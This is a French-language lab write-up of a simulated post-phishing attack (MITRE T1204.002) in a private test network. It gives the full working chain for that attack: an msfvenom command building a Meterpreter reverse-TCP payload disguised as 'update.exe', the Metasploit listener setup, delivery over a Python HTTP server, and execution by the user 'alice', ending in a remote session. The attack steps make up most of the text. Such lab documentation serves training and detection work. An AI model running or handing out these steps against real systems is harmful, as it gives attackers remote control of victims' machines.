## Attaque
### Contexte

Simulation d'un scénario post-phishing : l'utilisateur alice exécute une 
pièce jointe malveillante. L'attaquant obtient un accès distant à WS01 
via un reverse shell Meterpreter depuis Kali.

### Technique MITRE

| ID        | Technique                      | Tactique  |
| --------- | ------------------------------ | --------- |
| T1204.002 | User Execution: Malicious File | Execution |

### Prérequis

| Élément          | Valeur                                                            |
| ---------------- | ----------------------------------------------------------------- |
| Attaquant        | Kali 192.168.10.200                                               |
| Cible            | WS01 192.168.10.101                                               |
| Utilisateur      | LAB\alice                                                         |

### Exécution

#### 1. Génération du payload (Kali)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=4444 -f exe -o /tmp/update.exe
```

#### 2. Mise en place du listener (Kali)
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.200
set LPORT 4444
run
```

#### 3. Transfert vers la cible
```bash
cd /tmp
python3 -m http.server 8080
```
Téléchargement sur WS01 via `http://192.168.10.200:8080/update.exe`

#### 4. Exécution (WS01)

Dans explorer C:\Users\alice.LAB\Downloads -> double clic sur 'update.exe'
### Résultat

Session Meterpreter ouverte sur WS01 LAB\alice.

